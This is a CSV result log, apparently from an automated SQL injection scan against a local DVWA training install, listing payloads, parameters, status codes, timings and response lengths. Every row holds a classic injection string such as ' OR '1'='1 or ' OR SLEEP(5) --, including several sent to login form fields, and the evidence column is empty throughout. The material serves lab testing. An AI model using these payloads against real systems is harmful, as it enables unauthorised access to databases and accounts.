page_url,param_tested,method,payload,status,elapsed,length,evidence,baseline_length,baseline_elapsed
http://127.0.0.1/dvwa/,id,GET,' OR '1'='1,200,0.013369,1500,,1500,0.008072
http://127.0.0.1/dvwa/,id,GET,' OR '1'='1' -- ,200,0.007377,1500,,1500,0.008072
http://127.0.0.1/dvwa/,id,GET,' OR 1=1--,200,0.004541,1500,,1500,0.008072
http://127.0.0.1/dvwa/,id,GET,""" OR """" = """,200,0.006881,1500,,1500,0.008072
http://127.0.0.1/dvwa/,id,GET,' OR SLEEP(5) --,200,0.008597,1500,,1500,0.008072
http://127.0.0.1/dvwa/,id,GET,1' OR '1'='1,200,0.004559,1500,,1500,0.008072
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,' OR '1'='1,200,0.004594,1500,,1500,0.005148
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,' OR '1'='1' -- ,200,0.006269,1500,,1500,0.005148
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,' OR 1=1--,200,0.005449,1500,,1500,0.005148
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,""" OR """" = """,200,0.005981,1500,,1500,0.005148
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,' OR SLEEP(5) --,200,0.005049,1500,,1500,0.005148
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,1' OR '1'='1,200,0.004177,1500,,1500,0.005148
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,' OR '1'='1,200,0.005266,1500,,1500,0.006078
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,' OR '1'='1' -- ,200,0.004865,1500,,1500,0.006078
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,' OR 1=1--,200,0.005172,1500,,1500,0.006078
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,""" OR """" = """,200,0.004794,1500,,1500,0.006078
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,' OR SLEEP(5) --,200,0.004833,1500,,1500,0.006078
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,1' OR '1'='1,200,0.005737,1500,,1500,0.006078
http://127.0.0.1/dvwa/js/,id,GET,' OR '1'='1,200,0.004267,1173,,1173,0.004103
http://127.0.0.1/dvwa/js/,id,GET,' OR '1'='1' -- ,200,0.006063,1173,,1173,0.004103
http://127.0.0.1/dvwa/js/,id,GET,' OR 1=1--,200,0.004142,1173,,1173,0.004103
http://127.0.0.1/dvwa/js/,id,GET,""" OR """" = """,200,0.004081,1173,,1173,0.004103
http://127.0.0.1/dvwa/js/,id,GET,' OR SLEEP(5) --,200,0.003331,1173,,1173,0.004103
http://127.0.0.1/dvwa/js/,id,GET,1' OR '1'='1,200,0.004529,1173,,1173,0.004103
http://127.0.0.1/dvwa/css/,id,GET,' OR '1'='1,200,0.004203,1529,,1529,0.003646
http://127.0.0.1/dvwa/css/,id,GET,' OR '1'='1' -- ,200,0.003481,1529,,1529,0.003646
http://127.0.0.1/dvwa/css/,id,GET,' OR 1=1--,200,0.004529,1529,,1529,0.003646
http://127.0.0.1/dvwa/css/,id,GET,""" OR """" = """,200,0.003977,1529,,1529,0.003646
http://127.0.0.1/dvwa/css/,id,GET,' OR SLEEP(5) --,200,0.003466,1529,,1529,0.003646
http://127.0.0.1/dvwa/css/,id,GET,1' OR '1'='1,200,0.004987,1529,,1529,0.003646
http://127.0.0.1/dvwa/includes/,id,GET,' OR '1'='1,200,0.00459,1377,,1377,0.004171
http://127.0.0.1/dvwa/includes/,id,GET,' OR '1'='1' -- ,200,0.004905,1377,,1377,0.004171
http://127.0.0.1/dvwa/includes/,id,GET,' OR 1=1--,200,0.003375,1377,,1377,0.004171
http://127.0.0.1/dvwa/includes/,id,GET,""" OR """" = """,200,0.005281,1377,,1377,0.004171
http://127.0.0.1/dvwa/includes/,id,GET,' OR SLEEP(5) --,200,0.004975,1377,,1377,0.004171
http://127.0.0.1/dvwa/includes/,id,GET,1' OR '1'='1,200,0.002955,1377,,1377,0.004171
http://127.0.0.1/login.php,username,POST,' OR '1'='1,200,0.013585,1573,,1573,0.008417
http://127.0.0.1/login.php,password,POST,' OR '1'='1,200,0.011338,1573,,1573,0.008417
http://127.0.0.1/login.php,Login,POST,' OR '1'='1,200,0.006915,1573,,1573,0.008417
http://127.0.0.1/login.php,user_token,POST,' OR '1'='1,200,0.006557,1573,,1573,0.008417
http://127.0.0.1/login.php,username,POST,' OR '1'='1' -- ,200,0.008516,1573,,1573,0.008417
http://127.0.0.1/login.php,password,POST,' OR '1'='1' -- ,200,0.008483,1573,,1573,0.008417
http://127.0.0.1/login.php,Login,POST,' OR '1'='1' -- ,200,0.013134,1573,,1573,0.008417
http://127.0.0.1/login.php,user_token,POST,' OR '1'='1' -- ,200,0.0087,1573,,1573,0.008417
http://127.0.0.1/login.php,username,POST,' OR 1=1--,200,0.010942,1573,,1573,0.008417
http://127.0.0.1/login.php,password,POST,' OR 1=1--,200,0.011095,1573,,1573,0.008417
http://127.0.0.1/login.php,Login,POST,' OR 1=1--,200,0.010054,1573,,1573,0.008417
http://127.0.0.1/login.php,user_token,POST,' OR 1=1--,200,0.009087,1573,,1573,0.008417
http://127.0.0.1/login.php,username,POST,""" OR """" = """,200,0.008002,1573,,1573,0.008417
http://127.0.0.1/login.php,password,POST,""" OR """" = """,200,0.01255,1573,,1573,0.008417
http://127.0.0.1/login.php,Login,POST,""" OR """" = """,200,0.011171,1573,,1573,0.008417
http://127.0.0.1/login.php,user_token,POST,""" OR """" = """,200,0.00987,1573,,1573,0.008417
http://127.0.0.1/login.php,username,POST,' OR SLEEP(5) --,200,0.009693,1573,,1573,0.008417
http://127.0.0.1/login.php,password,POST,' OR SLEEP(5) --,200,0.009959,1573,,1573,0.008417
http://127.0.0.1/login.php,Login,POST,' OR SLEEP(5) --,200,0.009179,1573,,1573,0.008417
http://127.0.0.1/login.php,user_token,POST,' OR SLEEP(5) --,200,0.008699,1573,,1573,0.008417
http://127.0.0.1/login.php,username,POST,1' OR '1'='1,200,0.010872,1573,,1573,0.008417
http://127.0.0.1/login.php,password,POST,1' OR '1'='1,200,0.008465,1573,,1573,0.008417
http://127.0.0.1/login.php,Login,POST,1' OR '1'='1,200,0.009955,1573,,1573,0.008417
http://127.0.0.1/login.php,user_token,POST,1' OR '1'='1,200,0.009807,1573,,1573,0.008417
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,' OR '1'='1,200,0.004768,1500,,1500,0.005433
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,' OR '1'='1' -- ,200,0.00665,1500,,1500,0.005433
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,' OR 1=1--,200,0.00635,1500,,1500,0.005433
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,""" OR """" = """,200,0.005034,1500,,1500,0.005433
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,' OR SLEEP(5) --,200,0.004028,1500,,1500,0.005433
http://127.0.0.1/dvwa/?C=N;O=D,id,GET,1' OR '1'='1,200,0.004425,1500,,1500,0.005433
http://127.0.0.1/dvwa/images/,id,GET,' OR '1'='1,200,0.004785,2167,,2167,0.004921
